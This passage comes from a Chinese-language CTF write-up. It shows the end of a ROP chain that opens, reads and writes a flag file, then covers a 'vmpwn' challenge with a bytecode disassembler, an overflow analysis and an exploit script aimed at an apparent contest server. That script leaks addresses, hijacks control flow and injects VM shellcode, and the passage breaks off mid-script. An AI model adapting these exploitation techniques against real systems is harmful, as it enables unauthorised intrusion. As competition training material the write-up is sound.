    add_rsp_pp_ret = lbase + 0x0000000000085bf8 + 2
    ret_addr = stack - (0x7fffffffede8 - 0x7fffffffecd8)
    rop=p64(rdi)+p64(bss+0x100)
    rop+=p64(rsi)+p64(0) * 2
    rop+=p64(rdx)+p64(0) * 3
    rop+=p64(lbase+ctx.libc.sym['open'])
    rop+=p64(rdi)+p64(3)
    rop+=p64(rsi)+p64(bss) * 2
    rop+=p64(rdx)+p64(0x100) * 3
    rop+=p64(lbase+ctx.libc.sym['read'])
    rop+=p64(rdi)+p64(1)
    rop+=p64(rsi)+p64(bss) * 2
    rop+=p64(rdx)+p64(0x100) * 3
    rop+=p64(lbase+ctx.libc.sym['write'])
    add(0x300) # 16
    #dbg('b *0x5555555554B7\nc')
    edit(16, '\x00' * 0x100 + './flag\x00\x00' + '\x00' * 8 + rop)
    idx += 1
    write_content(ret_addr+8, p64(add_rsp_pp_ret))
    write_content(ret_addr+0x20, p64(bss+0x110-8))
    write_content(ret_addr+0x28, p64(leave_ret))
    context.log_level = 'debug'
    write_content(ret_addr, '\x6a')
    irt()
###  vmpwn
禁用了execve只能ORW
写个脚本解析出指令后静态分析
用来解析指令的脚本
    #coding=utf8
    #!/usr/bin/python3
    def parse_line(data, next_pc):
        try:
            op = data[next_pc]
            next_pc += 1
            if op == 0x10:
                msg = 'mov reg0, rsp'
            elif op >= 0x11 and op = 0x21 and op = 0x33 and op = 0x44 and op = 0x51 and op = 0x61 and op = 0x64 and op = 0x67 and op = 0x6a and op = 0x6d and op <= 0x6f:
                msg = 'xor reg%s, reg%s', (op-0x6d, op-0x6d)
            elif op == 0x7e:
                num = int.from_bytes(data[next_pc:next_pc+2], 'little', signed=True)
                next_pc += 2
                #next_pc += num
                msg = 'jmp %s' % hex(next_pc + num)
            elif op == 0x7f:
                msg = 'jmp reg0'
            elif op == 0x80:
                msg = 'call reg0'
            elif op == 0x81:
                num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
                next_pc += 8
                msg = 'add rsp, %s' % hex(num)
            elif op == 0x82:
                num = int.from_bytes(data[next_pc:next_pc+8], 'little', signed=True)
                next_pc += 8
                msg = 'sub rsp, %s' % hex(num)
            elif op == 0x88:
                num = int.from_bytes(data[next_pc:next_pc+2], 'little', signed=True)
                next_pc += 2
                msg = 'call %s' % hex(next_pc + num)
            elif op == 0x8f:
                num = data[next_pc]
                next_pc += 1
                functions = ['read', 'write', 'puts', 'free']
                msg = 'syscall %s' % (functions[num])
            elif op == 0x90:
                msg = 'ret'
            elif op == 0xff:
                msg = 'halt'
                next_pc = -1
            else:
                msg = 'error op %s' % hex(op)
                next_pc = -1
        except:
            next_pc = -1
            msg = ''
        return next_pc, msg
    def parse(data, pc):
        while pc != -1:
            next_pc, msg = parse_line(data, pc)
            print("%5s: %s" % (hex(pc), msg))
            pc = next_pc
    def find_gadget(data):
        for i in range(len(data)):
            try:
                pc = i
                next_pc, msg = parse_line(data, pc)
                if ('syscall' in msg) or ('pop reg' in msg):
                    count = 0
                    print('-' * 0x10)
                    while pc != -1 and count < 5:
                        print('%5s: %s' % (hex(pc), msg))
                        pc = next_pc
                        count += 1
                        next_pc, msg = parse_line(data, pc)
            except:
                continue
    if __name__ == '__main__':
        with open('code.txt', 'rb') as fd:
            data = fd.read()
        from sys import argv
        try:
            pc = int(argv[1], 16)
        except:
            pc = 0
        parse(data, pc)
        print('\n----------gadget------------')
        find_gadget(data)
解析结果关键位置:
      0x0: jmp 0x3a8
      0x3: sub rsp, 0x100
    ......
    0x29f: mov reg0, rsp
    0x2a0: push reg0
    0x2a1: pop reg1
    0x2a2: mov reg0, 0x0
    0x2ab: mov reg2, 0x1000
    0x2b4: syscall read
    0x2b6: mov reg0, rsp
    0x2b7: syscall puts
    ....
    0x301: mov reg0, &data[0x0]
    0x30a: push reg0
    0x30b: pop reg1
    0x30c: mov reg0, 0x1
    0x315: mov reg2, 0x1b
    0x31e: syscall write
    0x320: mov reg0, rsp
    0x321: push reg0
    0x322: pop reg1
    0x323: mov reg0, 0x0
    0x32c: mov reg2, 0x1000
    0x335: syscall read
    ....
    0x37f: mov reg0, &data[0x0]
    0x388: push reg0
    0x389: pop reg1
    0x38a: mov reg0, 0x1
    0x393: mov reg2, 0x20
    0x39c: syscall write
    0x39e: add rsp, 0x100
    0x3a7: ret
    0x3a8: mov reg0, 0x20205f5f5f5f5f20
    ....
    0x82e: call 0x3
    0x831: halt
最主要的是两个read的溢出：
    0x29f: mov reg0, rsp
    0x2a0: push reg0
    0x2a1: pop reg1
    0x2a2: mov reg0, 0x0
    0x2ab: mov reg2, 0x1000
    0x2b4: syscall read
    0x2b6: mov reg0, rsp
    0x2b7: syscall puts;  //重要
    ......
    0x320: mov reg0, rsp
    0x321: push reg0
    0x322: pop reg1
    0x323: mov reg0, 0x0
    0x32c: mov reg2, 0x1000
    0x335: syscall read
优先考虑用已有的gadget进行ROP，搜索过后发现并没有合适的gadget，就要换一种思路了
因为第一个read完后用的puts来输出，`\x00`表示字符串结束，可以填充0x100个非`\x00`字节，leak出虚拟栈上的第0x108处的.text段地址
要注意这里的call，保存指针不是常规意义上的”压栈”，它rsp是增加的（同理ret的rsp是减的）
大致思路：
第一次read先leak出指令的地址
    # leak cbase
    pay = 'a' * 0x100
    sa('name:', pay)
    code_addr = ru('\nok', drop=True)[-6:]
    code_addr = uu64(code_addr) - 0x831
    leak('code_addr', code_addr)
    cbase = code_addr - (0x555555757020 - 0x555555554000)
    leak('cbase', cbase)
第二次read，覆盖返回地址，跳到ret指令处，目的是使得rsp减小，后面要leak出heap的地址，而且不这么做直接跳到pop的地方的话没法过检查的
    0x3a7: ret
返回时执行的指令如下：
    0x37f: mov reg0, &data[0x0]
    0x388: push reg0
    0x389: pop reg1
    0x38a: mov reg0, 0x1
    0x393: mov reg2, 0x20
    0x39c: syscall write
    0x39e: add rsp, 0x100
    0x3a7: ret
可以看到push了一个栈地址，要leak出来，必须得下次调用puts时，rsp在这个push的地址的下方，这就是为什么要覆盖返回地址为ret指令
之后回到0x3位置，后面调用puts
      0x3: sub rsp, 0x100
      0xc: mov reg0, 0x2323232323232323
     0x15: mov data[0x0], reg0
     ...
代码为：
    # leak heap
    pay = 'a' * 0xf0 + p64(code_addr + 0x3) + p64(code_addr + 0x3a7) * 2  # ret
    sa('say:', pay)  
    pay = 'a' * 0x10
    sa('name:', pay)
    heap = ru('\nok', drop=True)[-6:]
    heap = uu64(heap)
    leak('heap', heap)
有了heap的地址(虚拟的栈在堆上)，可以往虚拟的栈上注入”shellcode”，然后ret到shellcode
由于syscall功能没有open
则shellcode第一件事情就是先leak出libc，计算出open的地址，覆盖这里的free为open，然后对flag进行open，read，write
完整exp:
    #coding=utf8
    from PwnContext import *
    context.terminal = ['xfce4-terminal', '--tab', '-x', 'zsh', '-c']
    context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096,timeout=2:ctx.recv(numb, timeout=timeout)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\x00'))
    uu64    = lambda data   :u64(data.ljust(8, '\x00'))
    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
    ctx.binary = './vmpwn'
    ctx.remote = ('124.70.153.199', 8666)
    #ctx.custom_lib_dir = './'
    ctx.remote_libc = './libc-2.23.so'
    ctx.debug_remote_libc = True
    #rs()
    rs('remote')
    # print(ctx.libc.path)
    # leak cbase
    pay = 'a' * 0x100
    sa('name:', pay)
    code_addr = ru('\nok', drop=True)[-6:]
    code_addr = uu64(code_addr) - 0x831
    leak('code_addr', code_addr)
    cbase = code_addr - (0x555555757020 - 0x555555554000)
    leak('cbase', cbase)
    # leak heap
    pay = 'a' * 0xf0 + p64(code_addr + 0x3) + p64(code_addr + 0x3a7) * 2  # ret
    sa('say:', pay)  
    pay = 'a' * 0x10
    sa('name:', pay)
    heap = ru('\nok', drop=True)[-6:]
    heap = uu64(heap)
    leak('heap', heap)
    # inject shellcode
    def mov_reg0(num):
        return '\x11' + p64(num)
    def mov_reg1(num):
        return '\x12' + p64(num)
    def mov_reg2(num):
        return '\x13' + p64(num)
    def syscall(idx):
        return '\x8f' + chr(idx)
    def halt():
        return '\xff'
    next_read_addr = (heap - 0x555555758050) + 0x55555575ad50
    shellcode_addr = next_read_addr + 0x108 
    filename_addr = u64('{_addr_}')